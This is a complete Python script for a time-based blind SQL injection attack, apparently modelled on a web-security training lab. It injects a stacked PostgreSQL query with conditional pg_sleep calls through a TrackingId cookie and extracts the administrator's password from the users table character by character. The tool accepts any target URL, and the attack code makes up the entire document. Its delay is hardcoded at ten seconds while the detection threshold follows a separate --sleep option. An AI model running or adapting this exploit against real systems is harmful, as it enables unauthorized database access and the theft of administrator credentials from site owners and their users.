import argparse
import logging
import re
import string
import sys
import time
import requests
from typing import Tuple, Optional
import warnings
import urllib3

# Suppress SSL warnings (useful when testing with self-signed certificates)
warnings.simplefilter('ignore', urllib3.exceptions.InsecureRequestWarning)

# Set up logging to print messages at different levels (info, debug, etc.)
logging.basicConfig(
    level=logging.INFO,  # Default level is INFO
    format='[%(levelname)s] %(message)s'  # Log format (shows log level and message)
)

def ask_to_continue(debug_mode: bool) -> bool:
    """
    Asks the user whether to continue, if debug mode is enabled.
    Useful for ensuring users are aware of each action taken during the process.
    """
    if debug_mode:
        while True:
            answer = input("Do you want to continue? (Y/N): ").strip().lower()
            if answer == 'y':  # If the user enters 'y', return True
                return True
            elif answer == 'n':  # If the user enters 'n', return False
                return False
            else:
                logging.info("Invalid input. Please enter Y or N.")  # Handle invalid input
    return True  # Default behavior if debug mode is off (always continue)

def start_session(base_url: str) -> Optional[Tuple[str, str]]:
    """
    Starts a session with the web app and gets the session and tracking cookies.
    Returns the session cookie and tracking ID if successful.
    """
    session_url = base_url + "/"  # Target URL
    session = requests.Session()  # Start a new session to store cookies

    try:
        response = session.get(session_url, verify=False)  # Make a request to start the session (disable SSL verification for testing)
        response.raise_for_status()  # Check if the request was successful (200 OK)
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to start session with {session_url}: {e}")
        return None  # Return None if the session fails

    logging.info(f"Session started. Status Code: {response.status_code}")

    # Extract cookies from the response headers
    cookie_header = response.headers.get('Set-Cookie', '')
    session_value_match = re.search(r'session=([^;]+)', cookie_header)
    tracking_id_match = re.search(r'TrackingId=([^;]+)', cookie_header)

    if not session_value_match or not tracking_id_match:
        logging.error("Could not find necessary cookies in response.")
        return None  # Return None if cookies are not found

    # Get session and tracking ID values from the cookies
    session_value = session_value_match.group(1)
    tracking_id = tracking_id_match.group(1)

    logging.debug(f"Extracted session: {session_value}")
    logging.debug(f"Extracted TrackingId: {tracking_id}")

    return session_value, tracking_id  # Return the cookies

def time_delay_sql_injection(base_url: str, session_cookie: str, sleep_duration: int, tracking_id_cookie: str) -> Optional[str]:
    """
    Perform a SQL injection attack by making the server sleep based on character-by-character testing.
    Attempts to extract the administrator's password by testing each character with time delays.
    """
    threshold = sleep_duration - 0.5  # Threshold to detect if the server took too long (indicating success)
    timeout = sleep_duration + 1  # Timeout for the request to avoid hanging forever

    characters_to_test = string.digits + string.ascii_letters  # All characters to test for the password
    logging.info(f"Characters to test: {characters_to_test}")

    extracted_password = ""  # Start with an empty string for the password
    position = 1  # Start at the first character of the password

    logging.info(f"Starting SQL injection against: {base_url}")
    logging.info("This may take a while depending on password length and response times.")

    try:
        while True:
            found_char = None
            for char in characters_to_test:
                # Prepare the SQL injection payload for each character
                payload = f"'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--'"

                headers = {
                    'Cookie': f"TrackingId={tracking_id_cookie}{payload}; session={session_cookie}"
                }

                logging.debug(f"Testing payload: {payload}")
                logging.debug(f"Request Headers: {headers}")

                start_time = time.time()  # Start measuring time
                try:
                    response = requests.get(base_url, headers=headers, verify=False, timeout=timeout)
                    end_time = time.time()  # End time measurement
                except requests.exceptions.Timeout:
                    end_time = time.time()
                    elapsed = end_time - start_time
                    if elapsed >= threshold:  # If the response took longer, this might indicate success
                        found_char = char
                        break
                    continue  # Otherwise, continue testing next character
                except requests.exceptions.RequestException as e:
                    logging.error(f"Request failed: {e}")
                    continue

                elapsed = end_time - start_time

                if elapsed >= threshold:
                    found_char = char  # Found the character at this position
                    break
            
            if found_char:
                extracted_password += found_char  # Add found character to the password
                logging.info(f"Position {position}: '{found_char}' - Current password: {extracted_password}")
                position += 1  # Move to the next character position
            else:
                logging.info(f"No character found at position {position}. Extraction complete.")
                break  # Stop if no character is found

        logging.info(f"Extracted administrator password: {extracted_password}")
        return extracted_password  # Return the fully extracted password

    except KeyboardInterrupt:
        logging.info(f"\nExtraction interrupted by user. Partial password: {extracted_password}")
        return extracted_password  # Return the password found so far
    except Exception as e:
        logging.critical(f"An unexpected error occurred: {e}")
        return None  # Return None if an unexpected error occurs

def parse_arguments():
    """
    Parse command-line arguments to get user input for the script.
    """
    parser = argparse.ArgumentParser(
        description='Script for performing conditional SQL injection attacks.',
        epilog='Example: python3 script.py --t http://example.com --loglevel DEBUG'
    )

    # Define command-line arguments
    parser.add_argument('--t', required=True, help='Target URL (e.g., http://example.com)')
    parser.add_argument('--user', required=False, help='Username for authentication (not used in current logic)')
    parser.add_argument('--cookie', required=False, help='Admin cookie (optional, not currently used)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode for extra prompts')
    parser.add_argument('--loglevel', default='INFO', choices=['INFO', 'DEBUG', 'ERROR', 'WARNING', 'CRITICAL'], help='Set log level')
    parser.add_argument('--sleep',type=int,default=3,required=False,help='Time based sleep seconds')

    return parser.parse_args()  # Return parsed arguments

def main():
    """
    Main function to manage the SQL injection attack and user interactions.
    """
    args = parse_arguments()  # Parse the command-line arguments

    # Set the logging level based on user input
    loglevel = getattr(logging, args.loglevel.upper(), logging.INFO)
    logging.getLogger().setLevel(loglevel)

    target_url = args.t  # Target URL for the attack
    debug_mode = args.debug  # Check if debug mode is enabled
    sleep_duration = args.sleep  # Sleep duration for timing attack

    logging.info("--- Starting session ---")
    if ask_to_continue(debug_mode):  # Ask if user wants to continue
        session_data = start_session(target_url)
        if session_data is None:
            logging.error("Failed to obtain session and tracking ID. Exiting.")
            sys.exit(1)  # Exit if session setup fails
        session_value, tracking_id = session_data  # Extract session and tracking ID
    else:
        logging.info("Session start aborted by user. Exiting.")
        sys.exit(0)  # Exit if user decides not to continue

    logging.info("--- Running conditional SQL injection ---")
    if ask_to_continue(debug_mode):  # Ask if user wants to proceed with SQL injection
        admin_password = time_delay_sql_injection(target_url, session_value, sleep_duration, tracking_id)
        if admin_password:
            logging.info(f"Successfully extracted administrator password: {admin_password}")
        else:
            logging.warning("Administrator password extraction failed or was interrupted.")
    else:
        logging.info("SQL injection aborted by user. Exiting.")
        sys.exit(0)  # Exit if user decides not to continue

if __name__ == "__main__":
    main()  # Run the script
